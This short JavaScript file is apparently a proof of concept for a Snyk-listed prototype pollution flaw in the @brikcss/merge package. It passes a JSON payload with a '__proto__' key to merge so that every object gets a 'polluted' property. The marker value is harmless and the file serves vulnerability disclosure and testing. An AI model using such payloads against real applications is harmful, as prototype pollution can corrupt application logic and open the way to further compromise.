//https://security.snyk.io/vuln/SNYK-JS-BRIKCSSMERGE-1727594
 
  const merge = require("@brikcss/merge");
  let obj = {};
  let malicious_payload = '{"__proto__":{"polluted":"yes"}}';

   

  merge({}, JSON.parse(malicious_payload));
// End of file
